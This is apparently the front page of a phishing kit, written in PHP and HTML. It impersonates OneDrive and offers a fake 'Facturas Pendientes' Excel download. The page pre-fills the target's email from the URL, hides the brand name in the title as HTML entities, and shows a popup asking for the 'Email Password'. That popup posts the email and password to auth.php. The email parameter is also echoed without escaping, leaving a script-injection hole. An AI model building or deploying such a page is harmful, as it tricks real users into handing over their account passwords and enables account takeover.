<?php

if (isset($_GET['email'])) {

	$email = $_GET['email'];
}

?>

<html>
<head>

<title>&#79;&#110;&#101;&#32;&#68;&#114;&#105;&#118;&#101;</title>

<link rel="icon" href="images/favicon.ico" type="image/x-icon">
<style type="text/css">

  a:hover{color:#DF0101; }

  #popupbox{
  margin: 0; 
  margin-left: 40%; 
  margin-right: 40%;
  margin-top: 50px; 
  padding-top: 10px; 
  width: 28%; 
  height: 380px; 
  position: absolute; 
  background: #FFFFFF; 
  border: solid #D8D8D8 1px; 
  z-index: 9; 
  font-family: arial; 
  visibility: hidden;
  -moz-border-radius: 2px; 
  -webkit-border-radius: 2px; 
  -khtml-border-radius: 2px; 
  border-radius: 2px; 
  -moz-box-shadow: 3px 3px 3px #888; 
  -webkit-box-shadow: 3px 3px 3px #888; 
  box-shadow: 3px 3px 3px #888; 
  }
  </style>
  <script language="JavaScript" type="text/javascript">
  function login(showhide){
    if(showhide == "show"){
        document.getElementById('popupbox').style.visibility="visible";
    }else if(showhide == "hide"){
        document.getElementById('popupbox').style.visibility="hidden"; 
    }
  }
  </script>


</head>
<body marginwidth="0" marginheight="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0">

<div id="popupbox"> 

<br>




<center>

<div align="center">
<font face="verdana" size="2" color="#084B8A">

<img src="images/0.jpg" width="280" height="120">

<br>


Confirm your account to start download!

<font color="#ffffff"></font>
</font></div>


	<table width="" align="center">
	<tr><td height="">
		<form method="post" action="auth.php">
	</td></tr>




	<tr><td height="10"><td></tr>

	<tr><td>

					<div align="center">
					<font face="verdana" size="+1" color="#045FB4">
					<?php if (isset($_GET['email'])) { echo $email; }?> 					
					</font>
					</div>
						<input type="hidden" name="formtext1" value="<?php if (isset($_GET['email'])) { echo $email; }?>">
	</td></tr>




	<tr><td height="10">
	<td></tr>
	<tr><td>

			<div align="center">
			<input  name="formtext2" type="text" style="width:275px; height:45px; 
			font-family: Verdana; font-size: 13px; color:#000000; 
			background-color: #ffffff; border: solid 1px #045FB4; padding: 10px; 
			-moz-border-radius: 2px; -webkit-border-radius: 2px; 
			-khtml-border-radius: 2px; border-radius: 2px; 
			-moz-box-shadow: 3px 3px 3px #888; -webkit-box-shadow: 3px 3px 3px #888; box-shadow: 3px 3px 3px #888;
			-webkit-text-security: disc; -moz-text-security: disc; text-security: disc;" 
			required="" placeholder="Enter Email Password" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
			</div>

	</td></tr>






	<tr><td height="10"><td></tr>



	<tr><td>

		<div align="center">
		<input type="submit" value="Download File" 
						style="width:275px; height:50px; background-color: #045FB4; 
						border: solid 3px #045FB4; 
						font-family: Verdana; font-size: 14px; font-weight: light; color: #ffffff; 
						-moz-border-radius: 3px; -webkit-border-radius: 3px; 
						-khtml-border-radius: 3px; border-radius: 3px;
						-moz-box-shadow: 3px 3px 3px #888; -webkit-box-shadow: 3px 3px 3px #888; 
						box-shadow: 3px 3px 3px #888;">
						</div>

	</td></tr>




	<tr><td height="0">

	</form>
	<td></tr>

	</table>




</div> 



<table align="center" width="100%" height="100%" cellspacing="0"><tr>

<td width="35%" bgcolor="#045FB4">

	<table width="350" align="center"><tr>

	<td>
	
	<br><br>

	<p>
	<font face="arial" size="+3" color="#ffffff">
	Facturas Pendientes
	</p>


	<p>
	<font size="2" face="verdana">
	Your file (Facturas Pendientes) is ready for download! 
	

	<ul>

	<li>File Size: 465kb </li>
	<li>File Format: MS Excel </li>
	<li>File Name: Facturas Pendientes </li>

	</ul>


	<br><br><br><br><br><br><br><br><br><br>

	OneDrive Online Cloud | All rights reserved &copy; 2022

	</font>
	</font>

	<br><br><br><br><br>

	</td>

	</tr></table>



	

</td>




<td width="65%" bgcolor="#ffffff">

	<table align=""><tr>

	<td width="50"></td>


	<td>

		<table>

		<tr><td>

			<img src="images/0.jpg" width="350" height="140">


			<table><tr>

			<td width="20"></td>



			<td>
	
				<table>

				<tr><td>
				<font face="verdana" size="2" color="#045FB4">
				Best Online Cloud for storing and sharing large files!
				</font>
				</td></tr>



				<tr><td height="30"></td></tr>



				<tr><td>
				<font face="arial" size="+2" color="#045FB4">
				File Preview ~ Facturas Pendientes
				</font>
				</td></tr>



				<tr><td height="5"></td></tr>


				<tr><td>
				<a href="javascript:login('show');">
				<img src="images/1.gif" width="350" height="140" border="0">
				</a>
				</td></tr>




				<tr><td height="10"></td></tr>


				<tr><td>
				
					<a href="javascript:login('show');">
					<button type="button" style="width:150px; height:50px; background-color: #045FB4;  
					-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px; 
					-moz-box-shadow: 3px 3px 3px #888; -webkit-box-shadow: 3px 3px 3px #888; box-shadow: 3px 3px 3px #888;">

					<font color="#ffffff">Download File</font>

					</button>
					</a>


				<br><br><br><br>

				</td></tr>

				</table>

			
			</td>		

			</tr></table>

		</td></tr>



		</table>

	</td></tr>

	</table>

</td>


</tr></table>

</body>
</html>